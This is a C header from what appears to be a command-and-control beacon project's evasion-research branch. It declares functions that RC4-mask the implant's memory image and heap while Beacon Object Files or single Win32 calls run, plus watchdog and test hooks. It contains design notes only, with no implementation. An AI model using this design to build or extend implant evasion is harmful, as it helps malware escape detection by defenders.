#pragma once

#include <windows.h>

/* Phase 3 BOF-window masking (evasion-research branch, section 13.11).
 *
 * Runs a Win32-only BOF (zero beacon-API imports - boff.cpp verifies via
 * the relocation stream) with the FULL beacon image and every tracked heap
 * block RC4-masked for the whole execution. Enter/exit transitions run
 * from a hand-assembled private page; a one-shot watchdog timer force-
 * restores plaintext if the BOF never returns, so the process can never
 * hang in the masked state. See sleepmask_bofwin.cpp for the byte-level
 * design. x64 only. */

#define BW_DEFAULT_WATCHDOG_MS 120000
#define BW_MAX_CALL_ARGS        10

/* TRUE when the engine pages are built and usable. Cheap; boff.cpp calls
 * this before offering a BOF the masked window. */
BOOL bofwin_supported(void);

/* CI diagnostics: the built stub page (capstone-mirror verification), or
 * NULL before the first bofwin_supported/window call. */
void * bofwin_test_stub_page(void);

/* CI diagnostics: last window phase (0 start / 1 VP done / 2 masked /
 * 3 BOF returned / 4 exit returned) - survives a crash for the log. */
int bofwin_test_phase(void);

/* CI diagnostics: block count of the last window before / after the
 * keep-plaintext filter (bofwin_call). */
void bofwin_test_blocks(int * before, int * after);
/* CI diagnostics: the return trampoline placed in the beacon image (see
 * bofwin_call), or NULL. */
void * bofwin_test_tramp(void);

/* Run entry(args, alen) inside the masked window. Returns FALSE when the
 * window cannot be served (engine unavailable, background threads active,
 * snapshot without .text, no watchdog) - the caller then runs the BOF
 * unmasked. watchdog_ms==0 selects BW_DEFAULT_WATCHDOG_MS. */
BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watchdog_ms);

/* Run ONE Win32 call with the beacon image masked - BeaconGate's bMask
 * (beacon_gate.cpp gate_dispatch). The call runs from a page-local thunk,
 * so nothing of the image executes while it is ciphertext. Only the image
 * is masked (tracked heap blocks stay plaintext: that is where the API's
 * buffers live), and an image section one of the args points into stays
 * plaintext too. watchdog_ms == 0: no watchdog (for a call that never
 * returns, e.g. ExitThread). FALSE = not served; the caller then runs the
 * call unmasked. */
BOOL bofwin_call(void * fn, const unsigned long long * args, int nargs,
                 unsigned long long * ret, DWORD watchdog_ms);
